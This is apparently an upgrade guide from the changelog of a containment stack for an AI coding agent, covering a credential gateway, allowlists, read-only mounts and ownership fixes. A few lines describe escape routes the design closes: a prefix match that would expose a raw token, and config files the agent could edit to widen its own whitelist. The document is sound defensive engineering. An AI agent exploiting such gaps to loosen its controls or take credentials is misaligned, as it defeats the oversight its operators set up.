Create the directory next to your `compose.yaml` and copy the reference
snippet. The path is yours to choose — this matches the one-directory-per-
service layout the examples now use, so your tree stays comparable to them:

```bash
mkdir -p cred-gateway
cp /path/to/repo/examples/claude-code/cred-gateway/github.conf cred-gateway/
```

Add the mount to the `cred-gateway` service:

```yaml
  cred-gateway:
    volumes:
      - ./cred-gateway:/etc/nginx/gateway.d:ro
```

Two rules when writing your own snippets — both are checked by
`tests/integration/00-config-lint`:

- **Exact matches only.** `location = /github/credential`. A prefix match like
  `location /github/` also exposes `/github/token`, which hands the dev
  container a raw installation token.
- **The host path must be invisible to the dev container.** If your snippets
  live inside whatever is mounted at `/workspace`, the agent can widen its own
  whitelist and wait for a restart.

Full rules in `stack/cred-gateway/gateway.d/README.md`.

### 3. Re-check your allowlist

If you use `001_allowlist.py` and any line carried a trailing comment, that
domain was blocked entirely in 0.1.0 regardless of what you intended. Those
lines now work as written — which means **traffic that was being denied will
start flowing**. Read the file once and confirm each entry is what you actually
want to permit:

```
api.example.com                 # was: blocked. now: GET, HEAD, OPTIONS
upload.example.com PUT,POST     # unchanged
```

### 4. `examples/dev-container` — add the shadow mount

```yaml
  dev:
    volumes:
      - ../:/workspace:cached
      - ../.devcontainer:/workspace/.devcontainer:ro   # add this
      - proxy-certs:/proxy-certs:ro
```

Nested mounts win over their parent, so this makes the stack config read-only
to the agent while the project stays writable. Rebuild the container for it to
take effect. Confirm with:

```bash
tests/run.sh 50
```

### 5. `examples/claude-code` — fix ownership of the persisted state

The dev container no longer runs as root, so the files under `./workspace/`
created by 0.1.0 are owned by a user that no longer writes them:

```bash
docker compose build --no-cache dev
docker compose up -d --force-recreate dev

# `agent` is `ubuntu` renamed, so it keeps uid/gid 1000 from ubuntu:24.04.
# Confirm before chowning — the wrong id is worse than no chown at all.
docker compose exec dev id agent      # expect uid=1000(agent) gid=1000(agent)
sudo chown -R 1000:1000 examples/claude-code/workspace/
```

The mount targets moved with it — `/root/.claude` → `/home/agent/.claude`, and
likewise for `.claude.json` and `.config`. If you are carrying a modified
`compose.yaml`, make the same change: left at `/root/`, the bind mounts land
somewhere Claude Code never reads, and settings and auth state silently vanish
on every recreate.

### 6. Verify the boundary end to end

```bash
tests/run.sh                       # the whole integration tier
```

Then, inside a running dev container:

```bash
/path/to/stack/scripts/smoke-test.sh
```

The checks that matter: the broker must be unreachable both directly and
through the proxy, and `/github/token`, `/anthropic/key` and `/cloudflare/token`
must all return 403 from the gateway.

---

## 0.1.0

Initial release. Broker, mitmproxy-based credential injection, nginx
cred-gateway with baked-in GitHub endpoints, two-network isolation, and the
`dev-container` and `claude-code` examples.
